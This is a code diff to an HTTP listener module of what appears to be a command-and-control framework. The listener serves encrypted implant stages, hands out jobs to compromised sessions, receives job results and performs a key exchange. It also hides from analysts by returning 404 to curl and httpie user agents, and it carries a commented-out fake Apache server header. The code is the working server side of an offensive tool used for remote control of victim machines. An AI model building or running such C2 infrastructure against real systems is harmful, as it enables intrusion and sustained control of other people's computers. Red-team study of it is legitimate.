@@ -1,19 +1,15 @@
 import ssl
-import json
 import sys
 import asyncio
+import os
 import logging
 import core.state as state
-from core.events import NEW_SESSION, SESSION_STAGED, SESSION_CHECKIN, JOB_RESULT
+import core.events as events
 from core.listener import Listener
 from core.session import Session
-from core.utils import get_ipaddress, gen_random_string, check_valid_guid
-from logging import Formatter
-from io import BytesIO
-from zipfile import ZipFile, ZIP_DEFLATED
-from base64 import b64encode
+from core.utils import get_ipaddress, gen_random_string
 from pprint import pprint
-from quart import Quart, Blueprint, request, jsonify, Response
+from quart import Quart, Blueprint, request, Response
 from quart.logging import default_handler, serving_handler
 
 
@@ -33,8 +29,8 @@ class STListener(Listener):
                 'Required'      :   True,
                 'Value'         :   'http'
             },
-            #'Host': {
-            #    'Description'   :   'Hostname/IP for staging.',
+            #'StageURL': {
+            #    'Description'   :   'URL for staging.',
             #    'Required'      :   True,
             #    'Value'         :   f"https://{get_ipaddress()}"
             #},
@@ -46,26 +42,11 @@ class STListener(Listener):
             'Port': {
                 'Description'   :   'Port for the listener.',
                 'Required'      :   True,
-                'Value'         :   443
-            },
-            'Cert': {
-                'Description'   :   'SSL Certificate file',
-                'Required'      :   False,
-                'Value'         :   'data/cert.pem'
-            },
-            'Key': {
-                'Description'   :   'SSL Key file',
-                'Required'      :    False,
-                'Value'         :   'data/key.pem'
+                'Value'         :   80
             }
         }
 
     def run(self):
-        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-        ssl_context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_COMPRESSION
-        ssl_context.set_ciphers('ECDHE+AESGCM')
-        ssl_context.load_cert_chain(certfile=self['Cert'], keyfile=self['Key'])
-        ssl_context.set_alpn_protocols(['http/1.1'])  # Only http/1.1
 
         """
         While we could use the standard decorators to register these routes, 
@@ -77,12 +58,12 @@ class STListener(Listener):
 
         http_blueprint = Blueprint(__name__, 'http')
         http_blueprint.before_request(self.check_if_naughty)
-        http_blueprint.after_request(self.make_normal)
+        #http_blueprint.after_request(self.make_normal)
 
-        http_blueprint.add_url_rule('/stage.zip', 'stage', self.stage, methods=['GET'])
-        http_blueprint.add_url_rule('/<GUID>', 'first_checkin', self.first_checkin, methods=['POST'])
-        http_blueprint.add_url_rule('/<GUID>/jobs', 'jobs', self.jobs, methods=['GET'])
-        http_blueprint.add_url_rule('/<GUID>/jobs/<job_id>', 'job_result', self.job_result, methods=['POST'])
+        http_blueprint.add_url_rule('/<uuid:GUID>', 'key_exchange', self.key_exchange, methods=['POST'])
+        http_blueprint.add_url_rule('/<uuid:GUID>', 'stage', self.stage, methods=['GET'])
+        http_blueprint.add_url_rule('/<uuid:GUID>/jobs', 'jobs', self.jobs, methods=['GET'])
+        http_blueprint.add_url_rule('/<uuid:GUID>/jobs/<job_id>', 'job_result', self.job_result, methods=['POST'])
 
         # Add a catch all route
         http_blueprint.add_url_rule('/', 'unknown_path', self.unknown_path, defaults={'path': ''})
@@ -93,20 +74,22 @@ class STListener(Listener):
         logging.getLogger('quart.app').setLevel(logging.DEBUG if state.args['--debug'] else logging.ERROR)
         logging.getLogger('quart.serving').setLevel(logging.DEBUG if state.args['--debug'] else logging.ERROR)
 
+        #serving_handler.setFormatter('%(h)s %(p)s - - %(t)s statusline: "%(r)s" statuscode: %(s)s responselen: %(b)s protocol: %(H)s')
+        #logging.getLogger('quart.app').removeHandler(default_handler)
+
         self.app.register_blueprint(http_blueprint)
         self.app.run(host=self['BindIP'],
                      port=self['Port'],
                      debug=False,
-                     ssl=ssl_context,
                      use_reloader=False,
-                     access_log_format='%(h)s %(p)s - - %(t)s statusline: "%(r)s" statuscode: %(s)s responselen: %(b)s protocol: %(H)s',
+                     #access_log_format=,
                      loop=loop)
 
     async def check_if_naughty(self):
         try:
             headers = request.headers['User-Agent'].lower()
             if 'curl' in headers or 'httpie' in headers:
-                return jsonify({}), 404
+                return '', 404
         except KeyError:
             pass
 
@@ -114,39 +97,36 @@ class STListener(Listener):
         #response.headers["server"] = "Apache/2.4.35"
         return response
 
-    async def stage(self):
-        with open('data/stage.zip', 'rb') as stage_file:
-            stage_file = BytesIO(stage_file.read())
-            with ZipFile(stage_file, 'a', compression=ZIP_DEFLATED, compresslevel=9) as zip_file:
-                zip_file.write("data/stage.py", arcname="Main.py")
-
-            self.dispatch_event(SESSION_STAGED, f'Sending stage ({sys.getsizeof(stage_file)} bytes) ->  {request.remote_addr} ...')
-            return Response(stage_file.getvalue(), content_type='application/zip')
-
-    @check_valid_guid
-    async def first_checkin(self, GUID):
-        data = json.loads(await request.data)
-        self.dispatch_event(NEW_SESSION, Session(GUID, request.remote_addr, data))
-        return jsonify({}), 200
-
-    @check_valid_guid
-    async def jobs(self, GUID):
-        self.app.logger.debug(f"Session {GUID} ({request.remote_addr}) checked in")
-        job = self.dispatch_event(SESSION_CHECKIN, (GUID, request.remote_addr))
-        if job:
-            return jsonify(job), 200
-
-        self.app.logger.debug(f"No jobs to give {GUID}")
-        return jsonify({}), 200
-
-    @check_valid_guid
-    async def job_result(self, GUID, job_id):
-        self.app.logger.debug(f"Session {GUID} posted results of job {job_id}")
-        data = json.loads(await request.data)
-        self.dispatch_event(JOB_RESULT, (GUID, data))
-
-        return jsonify({}), 200
-
     async def unknown_path(self, path):
         self.app.logger.error(f"Unknown path: {path}")
-        return jsonify({}), 404
+        return '', 404
+
+    async def key_exchange(self, GUID):
+        data = await request.data
+        pub_key = self.dispatch_event(events.KEX, (GUID, request.remote_addr, data))
+        return Response(pub_key, content_type='application/xml')
+
+    async def stage(self, GUID):
+        stage_file = self.dispatch_event(events.ENCRYPT_STAGE, (GUID, request.remote_addr))
+
+        if stage_file:
+            self.dispatch_event(events.SESSION_STAGED, f'Sending stage ({sys.getsizeof(stage_file)} bytes) ->  {request.remote_addr} ...')
+            return Response(stage_file, content_type='application/octet-stream')
+
+        return '', 400
+
+    async def jobs(self, GUID):
+        self.app.logger.debug(f"Session {GUID} ({request.remote_addr}) checked in")
+        job = self.dispatch_event(events.SESSION_CHECKIN, (GUID, request.remote_addr))
+        if job:
+            return Response(job, content_type='application/octet-stream')
+
+        self.app.logger.debug(f"No jobs to give {GUID}")
+        return '', 200
+
+    async def job_result(self, GUID, job_id):
+        data = await request.data
+        self.app.logger.debug(f"Session {GUID} posted results of job {job_id}")
+        self.dispatch_event(events.JOB_RESULT, (GUID, job_id, data))
+
+        return '', 200
